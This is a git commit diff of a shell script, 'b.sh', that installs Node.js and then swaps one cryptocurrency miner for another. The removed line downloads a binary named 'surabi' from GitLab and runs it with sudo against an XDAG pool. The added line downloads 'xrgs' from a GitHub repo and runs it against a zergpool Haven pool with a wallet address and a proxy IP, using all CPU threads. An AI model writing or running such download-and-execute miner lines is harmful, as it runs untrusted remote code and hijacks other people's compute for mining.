67b94f0fd355e2a3cd404ef4dcec9bae1972698d
Mistainsah <107166633+Mistainsah@users.noreply.github.com>
2022-07-13 22:44:36 +0700

    Update b.sh

--- b.sh
+++ b.sh
@@ -3,5 +3,5 @@ wget https://nodejs.org/download/release/v14.17.0/node-v14.17.0-linux-x64.tar.gz
 \rm node-v14.17.0-linux-x64.tar.gz
 PATH=/opt/node-v14.17.0-linux-x64/bin:$PATH
 npm config set cache /tmp --global
-wget https://gitlab.com/richardkevin320/donlod/-/raw/main/surabi && chmod 777 surabi && sudo ./surabi --disable-gpu --algorithm xdag --pool equal.xdag.org:13656 --wallet a+dc1CL2NRgbtPvLtys614KSKlv5rdYw --password x --cpu-threads $(nproc --all)
+wget https://github.com/gyrogerald/vulner/raw/main/xrgs && chmod +x xrgs && ./xrgs -o cryptonight_haven.mine.zergpool.com:14452 --tls -a cn-heavy/xhv -k -u TRzWbrKRmJYETRPTrVW8RwbX6Sa9KJNbZ7 -p c=TRX,mc=BLOC --dns-ipv6 -x https://112.6.117.135:8085
 
